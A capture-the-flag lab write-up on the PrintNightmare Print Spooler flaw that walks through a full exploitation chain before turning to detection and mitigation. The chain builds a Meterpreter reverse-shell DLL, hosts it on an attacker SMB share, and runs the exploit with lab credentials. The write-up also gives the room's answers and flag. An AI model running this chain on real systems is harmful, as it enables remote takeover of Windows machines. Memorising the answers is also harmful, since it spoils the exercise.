# PrintNightmare - Medium

1. [Windows Print Spooler Service](#windows-print-spooler-service)
2. [Remote Code Execution Vulnerability](#remote-code-execution-vulnerability)
3. [Try it yourself](#try-it-yourself)
4. [Indicators of Compromise](#indicators-of-compromise)
5. [Detection: Windows Event Logs](#detection-windows-event-logs)
6. [Detection: Packet Analysis](#detection-packet-analysis)
7. [Mitigation: Disable Print Spooler](#mitigation-disable-print-spooler)

## Windows Print Spooler Service

* Print spooler service - manages printing processes like queueing and scheduling; enabled by default in all Windows clients & servers.

* DCs (Domain Controllers) use print spooler service for printer pruning (removing printers that are not used anymore but are objects in AD).

```markdown
1. Where would you enable or disable Print Spooler Service? - Services
```

## Remote Code Execution Vulnerability

* CVE-2021-34527 (PrintNightmare) - RCE vulnerability; attacker can remotely inject malicious DLL & exploit it to get SYSTEM privileges.

* CVE-2021-1675 - another exploit related to print spooler; attacker needs direct/local access to machine.

```markdown
1. Provide the CVE of the Windows Print Spooler Remote Code Execution Vulnerability that doesn't require local access to the machine. - CVE-2021-34527

2. What date was the CVE assigned for the vulnerability? - 07/02/2021
```

## Try it yourself

```shell
#follow initial setup from TryHackMe
cd Desktop/pn

git clone https://github.com/tryhackme/CVE-2021-1675.git
#download exploit files

git clone https://github.com/tryhackme/impacket.git
#download impacket from THM repo

cd impacket

#install impacket
python setup.py install

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.29.147 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll
#create malicious dll

msfconsole -q

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST 10.10.29.147

set LPORT 4444

run -j
#run exploit as a job

jobs
#it is running in background

#now host malicious dll in SMB share on attacker machine
smbserver.py share /root/Desktop/share/ -smb2support
#share to be accessed is at \\10.10.29.147\share\malicious.dll

rpcdump.py @10.10.102.16 | egrep 'MS-RPRN|MS-PAR'
#check if victim fits criteria for exploit

cd CVE-2021-1675/

python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.102.16 '\\10.10.29.147\share\malicious.dll'
#run exploit
#Finance-01.THMdepartment.local is name of DC and domain
#along with credentials of low privilege Windows user

#now we have a Meterpreter shell
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

```markdown
1. What is the flag residing on the Administrator's Desktop? - THM{SiGBQPMkSvejvmQNEL}
```

## Indicators of Compromise

* Search for ```spoolsv.exe``` process launching ```rundll32.exe``` as a child process without any command-line arguments.

* Monitor for DLLs dropped in these folders - ```%WINDIR%\system32\spool\drivers\x64\3\``` and ```%WINDIR%\system32\spool\drivers\x64\3\Old\```

* Check for suspicious ```spoolsv.exe``` child processes.

* Log registry changes and check for print driver 'QMS 810'.

* Search for public DLLs, such as ```MyExploit.dll```, ```evil.dll```, ```addCube.dll```, ```mimilib.dll```, etc.

```markdown
1. Provide the first folder path where you would likely find the dropped DLL payload. - C:\Windows\System32\spool\drivers\x64\3

2. Provide the function that is used to install printer drivers. - pcAddPrinterDriverEx()

3. What tool can the attacker use to scan for vulnerable print servers? - rpcdump.py
```

## Detection: Windows Event Logs

* Logs related to Print Spooler activity are:

  * Microsoft-Windows-PrintService/Admin
  * Microsoft-Windows-PrintService/Operational

* Some events of interest can be viewed in Event Viewer in:

  * Microsoft-Windows-PrintService
  * Microsoft-Windows-SMBClient
  * Windows System
  * Microsoft-Windows-Sysmon

```markdown
1. Provide the name of the dropped DLL, including the error code. - svch0st.dll,0x45A

2. Provide the event log name and the event ID that detected the dropped DLL. - Microsoft-Windows-PrintService/Admin,808

3. Find the source name and the event ID when the Print Spooler Service stopped unexpectedly and how many times was this event logged? - Service Control Manager,7031,1

4. Provide the log name, event ID, and destination port. - Microsoft-Windows-Sysmon/Operational,3,4747

5. Provide the attacker's IP address and the hostname. - 10.10.210.100,ip-10-10-210-100.eu-west-1.compute.internal

6. Provide the full path to the dropped DLL and the earliest creation time in UTC. - C:\Windows\System32\spool\drivers\x64\3\New\svch0st.dll,2021-08-13 17:33:37.282
```

## Detection: Packet Analysis

```markdown
1. What is the host name of the domain controller? - WIN-1O0UJBNP9G7

2. What is the local domain? - printnightmare.local

3. What user account was utilized to exploit the vulnerability? - lowprivlarry

4. What was the malicious DLL used in the exploit? - letmein.dll

5. What was the attacker's IP address? - 10.10.124.236

6. What was the UNC path where the malicious DLL was hosted? - \\10.10.124.236\sharez

7. What was the associated protocol? - SMB3
```

## Mitigation: Disable Print Spooler

* Check if Print Spooler service is running:

```ps
Get-Service -Name Spooler
```

* Disable Print Spooler service:

```ps
Stop-Service -Name Spooler -Force

Set-Service -Name Spooler -StartupType Disabled
```

* If print spooler service cannot be disabled, disable inbound remote printing through Group Policy.

```markdown
1. Provide two ways to manually disable the Print Spooler Service. - PowerShell, Group Policy

2. Where can you disable the Print Spooler Service in Group Policy? - Computer Configuration / Administrative Templates / Printers

3. Provide the command in PowerShell to detect if Print Spooler Service is enabled and running. - Get-Service -Name Spooler
```
